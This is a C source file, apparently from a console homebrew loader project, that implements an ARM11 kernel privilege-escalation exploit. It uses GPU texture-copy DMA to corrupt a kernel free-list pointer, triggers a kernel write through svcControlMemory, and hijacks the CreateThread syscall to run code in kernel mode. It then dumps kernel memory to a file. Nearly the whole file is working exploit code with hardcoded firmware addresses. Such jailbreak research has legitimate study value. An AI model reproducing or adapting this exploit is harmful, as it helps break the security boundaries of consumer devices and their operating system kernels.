/*
 * uvloader.c - Userland Vita Loader entry point
 * Copyright 2012 Yifan Lu
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define START_SECTION __attribute__ ((section (".text.start"), naked))

// make sure code is PIE
#ifndef __PIE__
#error "Must compile with -fPIE"
#endif

int (*IFile_Open)(void *this, const short *path, int flags) = 0x0022FE08;
int (*IFile_Write)(void *this, unsigned int *written, void *src, unsigned int len) = 0x00168764;
int (*memcpy)(void *dst, const void *src, unsigned int len) = 0x0023FF9C;
int (*GX_SetTextureCopy)(void *input_buffer, void *output_buffer, unsigned int size, int in_x, int in_y, int out_x, int out_y, int flags) = 0x0011DD48;
int (*GSPGPU_FlushDataCache)(void *addr, unsigned int len) = 0x00191504;
int (*svcSleepThread)(unsigned long long nanoseconds) = 0x0023FFE8;
int (*svcControlMemory)(void **outaddr, unsigned int addr0, unsigned int addr1, unsigned int size, int operation, int permissions) = 0x001431A0;

int uvl_entry();

/********************************************//**
 *  \brief Starting point from exploit
 *
 *  Call this from your exploit to run UVLoader.
 *  It will first cache all loaded modules and
 *  attempt to resolve its own NIDs which
 *  should only depend on sceLibKernel.
 *  \returns Zero on success, otherwise error
 ***********************************************/

int START_SECTION
uvl_start ()
{
    __asm__ volatile (".word 0xE1A00000");
    uvl_entry();
    __asm__ volatile ("bx lr");
}

int
do_gshax_copy (void *dst, unsigned int len, unsigned int check_val, int check_off)
{
    unsigned int result;

    do
    {
        memcpy (0x18401000, 0x18401000, 0x10000);
        GSPGPU_FlushDataCache (0x18402000, len);
        // src always 0x18402000
        GX_SetTextureCopy(0x18402000, dst, len, 0, 0, 0, 0, 8);
        GSPGPU_FlushDataCache (0x18401000, 16);
        GX_SetTextureCopy(dst, 0x18401000, 0x40, 0, 0, 0, 0, 8);
        memcpy(0x18401000, 0x18401000, 0x10000);
        result = *(unsigned int *)(0x18401000 + check_off);
    } while (result != check_val);

    return 0;
}

int
arm11_kernel_exploit_setup (void)
{
    unsigned int patch_addr;
    unsigned int *buffer;
    int i;
    int (*nop_func)(void);
    int *ipc_buf;
    int model;

    // part 1: corrupt kernel memory
    buffer = 0x18402000;
    // 0xFFFFFE0 is just stack memory for scratch space
    svcControlMemory(0xFFFFFE0, 0x18451000, 0, 0x1000, 1, 0); // free page
    patch_addr = *(int *)0x08F028A4;
    buffer[0] = 1;
    buffer[1] = patch_addr;
    buffer[2] = 0;
    buffer[3] = 0;
    // overwrite free pointer
    do_gshax_copy(0x18451000, 0x10u, patch_addr, 4);
    // trigger write to kernel
    svcControlMemory(0xFFFFFE0, 0x18450000, 0, 0x1000, 1, 0);

    // part 2: obfuscation or trick to clear code cache
    for (i = 0; i < 0x1000; i++)
    {
        buffer[i] = 0xE1A00000; // ARM NOP instruction
    }
    buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
    nop_func = *(unsigned int *)0x08F02894 - 0x10000; // 0x10000 below current code
    do_gshax_copy(*(unsigned int *)0x08F028A0 - 0x10000, 0x10000, 0xE1A00000, 0);
    nop_func ();

    /*
    // part 3: get console model for future use (?)
    __asm__ ("mrc p15,0,%0,c13,c0,3\t\n"
             "add %0, %0, #128\t\n" : "=r" (ipc_buf));

    ipc_buf[0] = 0x50000;
    __asm__ ("mov r4, %0\t\n"
             "mov r0, %1\t\n"
             "ldr r0, [r0]\t\n"
             "svc 0x32\t\n" :: "r" (ipc_buf), "r" (0x3DAAF0) : "r0", "r4");

    if (ipc_buf[1])
    {
        model = ipc_buf[2] & 0xFF;
    }
    else
    {
        model = -1;
    }
    *(int *)0x8F01028 = model;
    */

    return 0;
}

// after running setup, run this to execute func in ARM11 kernel mode
int __attribute__((naked))
arm11_kernel_exploit_exec (int (*func)(void))
{

    __asm__ ("mov r5, %0\t\n" // R5 = 0x3D1FFC, not used. likely obfusction.
             "svc 8\t\n" // CreateThread syscall, corrupted, args not needed
             "bx lr\t\n" :: "r" (0x3D1FFC) : "r5");
}

void
invalidate_icache (void)
{
    __asm__ ("mcr p15,0,%0,c7,c5,0\t\n"
             "mcr p15,0,%0,c7,c5,4\t\n"
             "mcr p15,0,%0,c7,c5,6\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

void
invalidate_dcache (void)
{
    __asm__ ("mcr p15,0,%0,c7,c14,0\t\n"
             "mcr p15,0,%0,c7,c10,4\t\n" :: "r" (0));
}

int __attribute__((naked))
arm11_kernel_dump (void)
{
    __asm__ ("add sp, sp, #8\t\n"
             "ldr lr, [sp], #4\t\n" ::: "lr");

    // fix up memory
    *(*(int **)0x08F028A4 + 2) = 0x8DD00CE5;
    invalidate_icache ();
    //memcpy (0xE4410000, 0xFFFF0000, 0x1000);
    invalidate_dcache ();

    __asm__ ("movs r0, #0\t\n"
             "bx lr\t\n");
}

/********************************************//**
 *  \brief Entry point of UVLoader
 *
 *  \returns Zero on success, otherwise error
 ***********************************************/
int
uvl_entry ()
{
    unsigned int addr;
    void *this = 0x08F10000;
    int *written = 0x08F01000;
    int *buf = 0x18410000;
    int i;

    // wipe memory for debugging purposes
    for (i = 0; i < 0x1000/4; i++)
    {
        buf[i] = 0xdeadbeef;
    }

    arm11_kernel_exploit_setup ();
    arm11_kernel_exploit_exec (arm11_kernel_dump);

    IFile_Open(this, L"dmc:/mem-0xFFFF0000.bin", 6);
    //GSPGPU_FlushDataCache (buf, 0x1000);
    //svcSleepThread (0x400000LL);
    IFile_Write(this, written, buf, 0x1000);
    
    /*
    // FCRAM dump
    for (addr = 0x14000000; addr < 0x1A800000; addr += 0x10000)
    {
        GSPGPU_FlushDataCache (addr, 0x10000);
        GX_SetTextureCopy (addr, buf, 0x10000, 0, 0, 0, 0, 8);
        GSPGPU_FlushDataCache (buf, 0x10000);
        svcSleepThread (0x400000LL);
        IFile_Write(this, written, buf, 0x10000);
    }
    */

    //while (1);

    svcSleepThread (0x6fc23ac00LL); // wait 30 seconds

    return 0;
}



/********************************************//**
 *  \brief Exiting point for loaded application
 *
 *  This hooks on to exit() call and cleans up
 *  after the application is unloaded.
 *  \returns Zero on success, otherwise error
 ***********************************************/
int
uvl_exit (int status)
{
    return 0;
}
